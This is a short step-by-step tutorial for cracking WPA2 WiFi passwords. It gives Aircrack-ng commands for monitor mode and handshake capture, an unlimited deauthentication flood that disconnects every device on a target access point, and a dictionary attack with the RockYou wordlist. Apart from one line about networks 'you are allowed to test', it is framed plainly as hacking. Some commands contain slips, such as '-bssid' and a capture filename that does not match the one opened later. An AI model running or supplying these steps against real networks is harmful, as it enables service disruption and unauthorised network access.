This is how to use handshake attack on network

---

### **What You Need**  
- A **laptop**  
- **VMWare** or **VirtualBox** (for a virtual machine)  
- A **WiFi adapter** that supports **monitor mode**  
- A **WiFi network** that you are allowed to test  

---

### **Steps to Hack WiFi (WPA2)**  

1. **Check your WiFi interface**  
   ```bash
   iw dev
   ```
   This shows your WiFi interfaces. Look at the name (example: `wlan0`).  

2. **Stop conflicting processes**  
   ```bash
   sudo airmon-ng check kill
   ```
   This stops other programs that may block Aircrack-NG.  

3. **Enable monitor mode**  
   ```bash
   sudo airmon-ng start wlan0
   ```
   This puts your WiFi adapter into **monitor mode** (new name: `wlan0mon`).  

4. **Check if monitor mode is working**  
   ```bash
   iw dev
   ```
   This confirms that the adapter is now in **monitor mode**.  

5. **Scan for WiFi networks**  
   ```bash
   sudo airodump-ng wlan0mon
   ```
   This shows all WiFi networks around you.  

6. **Important details:**  
   - **MAC address** of the network  
   - **Signal strength**  
   - **Channel number**  
   - **Encryption type** (WPA/WPA2/WEP)  

7. **Capture WiFi traffic**  
   ```bash
   sudo airodump-ng -w captures -bssid <MAC Address> wlan0mon
   ```
   This saves the network traffic into a file.  

8. **Disconnect all devices from the WiFi**  
   ```bash
   sudo aireplay-ng --deauth 0 -a <MAC Address of AP> wlan0mon
   ```
   This forces devices to reconnect, so we can capture the **handshake**.  

9. **Open the captured file in Wireshark**  
   ```bash
   wireshark capture-01.cap
   ```
   This lets you see the captured network traffic.  

10. **Filter for WPA handshake packets**  
    ```
    eapol
    ```
    This shows **only handshake packets** in Wireshark.  

11. **Turn off monitor mode**  
    ```bash
    sudo airmon-ng stop wlan0mon
    ```
    This returns your WiFi adapter to normal mode.  

12. **Extract the RockYou wordlist**  
    ```bash
    sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
    ```
    This extracts a **wordlist** of common passwords.  

13. **Crack the WiFi password**  
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
    ```
    This tries to find the password using the **wordlist**.  

---

### **Final Result**  
- **If successful:** "Key found!" and the password appears.  
- **If failed:** You need a better wordlist.  

